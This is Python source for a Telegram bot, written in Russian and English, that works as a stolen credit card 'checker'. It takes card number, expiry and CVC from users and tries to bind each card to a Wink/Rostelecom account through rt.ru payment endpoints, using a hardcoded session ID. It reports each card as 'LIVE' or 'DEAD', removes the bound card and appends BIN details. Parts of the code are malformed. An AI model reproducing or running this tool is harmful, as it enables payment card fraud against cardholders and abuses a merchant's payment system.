import logging
from dateutil import parser
import sqlite3
import os
import requests
import time
import string
import random
import asyncio
from aiogram import Bot,Dispatcher, executor, types
import threading
from threading import Thread
import re
from datetime import datetime, timedelta
from asyncio import new_event_loop, set_event_loop
import queue
from queue import Queue
import aiohttp
import asyncio
from time import sleep
from aiogram.types import ReplyKeyboardRemove, \
    ReplyKeyboardMarkup, KeyboardButton, \
    InlineKeyboardMarkup, InlineKeyboardButton

queue = queue.Queue()

inlinelink = (InlineKeyboardButton('Подписаться', url='https://t.me/joinchat/OEAFK9y2X5NhODI8'))

inline_freecc = InlineKeyboardMarkup(row_width=2).add(inlinelink)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
CHANNEL_ID = -1001354267472
PREFIX = "/,!,?"
bot = Bot(
    token='Ваш токен')
dp = Dispatcher(bot=bot)
admin = 1634537933

async def try_or(fn, df):
    try:
        return await fn()
    except Exception as err:
        print(14)
        print(err)
        return df

headers = {
    "User-Agent": "WINK/1.34.1 (Android/11)",
    "session_id": "СЮДА SESSION ID",
    "x-rt-uid": "",
    "x-rt-san": "",
}

    
def try_or(fn, df):
    try:
        return fn()
    except Exception as err:
        print(14)
        print(err)
        return df

async def between_callback(card, mm, yy, cvc, queue):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    loop.run_until_complete(Gateway1(card, mm, yy, cvc, queue))
    a = queue.get()
    loop.close()
    queue.put(a)



def check_sub(chat_member):
    if chat_member['status'] != 'left':
        return True
    else:
        return False

def getBinInfo(cc):
    cardbrandregex = '<td width="40%">Card Brand</td>.?.?.?.?.?<td style="text-align: left;">(.+?)</td>'
    cardtyprergex = '<td width="40%">Card Type</td>.?.?.?.?.?<td width="60%" style="text-align: left;"> (.*?) </td>'
    cardleverregex = '<td width="40%">Card Level</td>.?.?.?.?<td width="60%" style="text-align: left;"> (.+?) </td>'
    banknameregex = 'td width="40%">Issuer Name / Bank</td>.?.?>?.?<td width="60%" style="text-align: left;"> <a class="ml-2 text-decoration-non text-dark" title=".*?" href=".*?">(.*?)</a> <a class="ml-2" title=".*?" href=".*?"><i class="fas fa-external-link-alt"></i></a> </td>.?.?.?.?.?</tr>'
    temp1 = re.findall("(......)(..........)", str(cc))
    if temp1 == []:
        return ["------", "------", "------", "------"]
    temp2 = temp1[0][0]
    raw = str(requests.get(f"https://bincheck.io/details/{temp2}").content)
    if len(re.findall("is invalid", raw)) >= 1:
        return ["------", "------", "------", "------"]
    _ = re.findall(cardbrandregex, raw)
    if _ == []:
        cardbrand = " ------"
    else:
        cardbrand = _[0]
    _ = re.findall(cardtyprergex, raw)
    if _ == []:
        cardtypre = " ------"
    else:
        cardtypre = _[0]
    _ = re.findall(cardleverregex, raw)
    if _ == []:
        cardlever = " ------"
    else:
        cardlever = _[0]
    _ = re.findall(banknameregex, raw)
    if _ == []:
        banknamer = " ------"
    else:
        banknamer = _[0]
    print("bincheck done")
    return [cardbrand, cardtypre, cardlever, banknamer]


headers = {
    "User-Agent": "WINK/1.34.1 (Android/11)",
    "session_id": "СЮДА SESSION ID",
    "x-rt-uid": "",
    "x-rt-san": "",
}

headers2 = {
            "User-Agent": "WINK/1.34.1 (Android/11)",
            "Accept": "application/json, text/plain, */*",
            "Referer": "https://wink.rt.ru/",
            "Origin": "https://wink.rt.ru",
}

#json2 = {
     #       "authPay": {
     #           "orderId": json_body["order_id"],
     #           "payAmount": json_body["pay_amount"],
   #             "payCurrId": "RUB",
    #            "reqTime": "2021-09-15T01:00:37.314+04:00",
   #         },
  #          "cardCvc": str('098'),
   #         "cardExpMonth": "02",
    #        "cardExpYear": int(f"2023"),
    #        "cardHolder": "IVAN IVANOV",
 #           "cardNumber": str('2202202481445454'),
 #           "reqId": json_body["req_id"],
 #           "reqType": "cardRegister",
#        }

async def Getcard():
    while True:
        print('Get card')
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get("https://cnt-brsk-itv02.svc.iptv.rt.ru/api/v2/portal/bank_cards") as r:
                item = await r.json()
                print (item)
                total = item['total_items']
                data = "items"
                if item != None:
                    try:
                        if total > 0:
                            iq = item['items']
                            items = iq[0]['id']
                            print(items)
                            return items
                        if total == 0:
                            return 0
                        else:
                            time.sleep(3)
                    except Exception as err:
                        time.sleep(2)



async def deleteCard(cardid):
    print("kill valid cc")
    url = f"https://cnt-brsk-itv02.svc.iptv.rt.ru/api/v2/portal/bank_cards/{cardid}"
    params = None
    data = "notification"
    json = None
    ff = lambda: requests.delete(
        url,
        params=params,
        headers=headers,
        json=json,
)
    while True:
        # kk_ = try_or(lambda: ff_(), None)
        # print(kk_)
        kk = try_or(lambda: ff(), None)
        try:
            # print (kk)
            # print(kk.text)
            if data in kk.text:
                # print(kk.json())
                return kk.json()
                sleep(0.1)
                break
            else:
                sleep(0.1)
        except Exception as err:
            print(err)

async def Wink():
    json ={'is_should_link_card':'true',
'payment_method_id':'1',
'purchase_option_id':'0',
'service_id':'98776234',
'variant_id':'365772280'}
    json2 ={'events':
        0:{
        'broadcast_type':"ott",
        'current_mrf':	"ct",
        'device_type':	"NCWEB",
        'event_counter':12,
        'event_id':	"purchase_request",
        'event_version':1,
        'home_mrf':	"ct",
        'purchase_option':{
        'content_id':0,
        'currency':	"RUB",
        'package_id':	98776234,
        'purchase_cost':29900,
        'service_id':98776234,
        'usage_model':"SERVICE"},
        'san':	99110381239,
        'timestamp':1638446011205,
        'uid':""']'}
    headers = {
        "User-Agent": "WINK/1.34.1 (Android/11)",
        "session_id": "235f1472-4df5-11ec-bea9-f063f976f300:46526877:46141743:2",
        "x-rt-uid": "",
        "x-rt-san": "",}
    while True:
        try:
            async with aiohttp.ClientSession(headers=headers) as session:
                async with session.post('cnt-odcv-itv01.svc.iptv.rt.ru/event_collector',json=json2) as s:
                    a = await s.json()
                    print(a)
            async with aiohttp.ClientSession(headers=headers) as session:
                async with session.post('https://cnt-odcv-itv03.svc.iptv.rt.ru/api/v2/portal/buy',json=json) as r:
                    dataa = "order_id"
                #data = await r.json(
                    data = await r.json()
                    print(data)
                    if dataa in data:
                        return data
                        break
                    else:
                        time.sleep(3)
        except Exception as err:
            print(err)
            time.sleep(3)



#    async with aiohttp.ClientSession(headers=headers2s,json=json2) as sessionn:
  #      async with sessionn.post('https://securepayments.sberbank.ru:9001/rtk_binding/request') as rr:
  #          json_body2 = await rr.json()
 #           print (json_body2)


async def Wink2(card, mm, yy, cvc):
    while True:
        a = await Wink()
        print(a)
        data = a
        json = {
            "authPay": {
                "orderId": data["order_id"],
                "payAmount": data["pay_amount"],
                "payCurrId": "RUB",
                "reqTime": "2021-09-15T01:00:37.314+04:00",
            },
            "cardCvc": str(cvc),
            "cardExpMonth": int(mm),
            "cardExpYear": int(f"20{yy}"),
            "cardHolder": "IVAN IVANOV",
            "cardNumber": str(card),
            "reqId": data["req_id"],
            "reqType": "cardRegister",
        }
        headers = {
            "Host": "isespp.pay.rt.ru",
            "User-Agent": "WINK/1.34.1 (Android/11)",
            "Accept": "application/json, text/plain, */*",
            "Referer": "https://wink.rt.ru/",
            "Origin": "https://wink.rt.ru",
        }
        #url = 'https://securepayments.sberbank.ru:9001/rtk_binding/request'
        url = 'https://isespp.pay.rt.ru/p/1/driver/sdbc'
        if 'order_id' in data:
            async with aiohttp.ClientSession(headers=headers,) as session:
                async with session.post(url,json=json) as r:
                    dataa = "order_id"
                    check = await r.json()
                    print(check)
                    return check
                break
        else:
            time.sleep(3)

async def Gateway1(card, mm, yy, cvc, queue):
        items = await Getcard()
        ccv = f'{card}|{mm}|{yy}|{cvc}'
        if items != 0:
            print (await deleteCard(items))
        if len(str(yy)) == 4:
            yy = int(str(yy)[2:])
        bind = await Wink2(card, mm, yy, cvc)
        print(bind)
        if "reqNote" in bind:
            bindd = bind['reqNote']
            try:
                result = (f""" <code>💳 {card}|{mm}|{yy}|{cvc}\n\nStatus: 🔴 DEAD INSIDE</code>""")
                queue.put(result)

            except KeyError as e:
                result = (f"""{card}|{mm}|{yy}|{cvc}:❌: ------""")
                queue.put(result)
            except:
                result = (f'''Ошибка!!!''')
                queue.put(result)
        else:
            items = await Getcard()
            ccv = f'{card}|{mm}|{yy}|{cvc}'
            if items != 0:
                print(await deleteCard(items))
            print(f"{card}|{mm}|{yy}|{cvc}:✅")
            result = (f""" <code>💳 {ccv} \n\nStatus:🟢 LIVE - CHARGE 15₽ </code>""")
            queue.put(result)

@dp.message_handler(commands=['start'], commands_prefix=PREFIX)
async def start_checker(message: types.Message):
    if check_sub(await bot.get_chat_member(chat_id=-1001569282134,user_id=message.from_user.id)) == False:
        await message.reply(
            text=f'''
❌ ERROR: FRAUD RETARD

😟 Для работы чекера подпишитесь на новостной канал!
''',parse_mode='HTML',reply_markup=inline_freecc
)

    elif check_sub(await bot.get_chat_member(chat_id=-1001569282134, user_id=message.from_user.id)) == True:
        await message.reply(
            text=f'''
.darque [Beta-Test Checker]

✔️ FREE CHECKS CC
✔️ Max 30 cc in one message

Format:
/chk 4276300059689441|01|24|554

🧛🏻 owner - @b1assed
''')

@dp.message_handler(commands="chk")
async def cc(message: types.Message):
    ccc = message.text[len('/chk '):]
    user = message.from_user.username
    chatikid = message.from_user.id
   # cursor.execute('SELECT * FROM users WHERE id = ?', (message.from_user.id,))
    if check_sub(await bot.get_chat_member(chat_id=-1001569282134, user_id=message.from_user.id)) == False:
        await message.reply(
            text=f'''
    ❌ ERROR: FRAUD RETARD

    😟 Для работы чекера подпишитесь на новостной канал!
    ''', parse_mode='HTML', reply_markup=inline_freecc
        )
    elif check_sub(await bot.get_chat_member(chat_id=-1001569282134, user_id=message.from_user.id)) == True:
        ccc = message.text[len('/chk'):]
        user = message.from_user.username
        ccs = ccc.split(sep=None, maxsplit=9999)
        user = message.from_user.username
        for cc in ccs:
            ccs = cc.capitalize()
            asd = re.findall("(................)\|(..)\|(..)\|(...)", ccs)
            if asd == []:
                await message.reply("используй так: /chk 1111111111111111|01|23|123")
                return
            if (int(asd[0][1]) > 12) or (int(asd[0][1]) <= 0) or (int(asd[0][2]) < 21) or (
                    asd[0][2] == str(datetime.now().year).replace("20", "")) & (
                    int(asd[0][1]) <= int(datetime.now().month)):
                await message.reply("Не корректный срок действия!")
                #continue
            messageFirst = await message.reply("Proccesing...")
            binInfo = getBinInfo(asd[0][0])
            time.sleep(1)
            try:
                await Gateway1(asd[0][0], asd[0][1], asd[0][2], asd[0][3],queue)
                resq = queue.get()
                await messageFirst.edit_text(resq + f"""\n\nБанк: <code>{binInfo[3]}</code> \nType: <code>{binInfo[0]} [{binInfo[1]}]</code> \nУровень: <code>{binInfo[2]}</code> \n\n⌧ Checker - @DarqueBot""",parse_mode="HTML")
               # await asyncio.sleep(11)
                continue
            except KeyError as e:
                await messageFirst.edit_text("Erroooorrr!!")
            except Exception as err:
                print(err)
                continue






if __name__ == '__main__':
    set_event_loop(new_event_loop())
    executor.start_polling(dp, skip_updates=True)
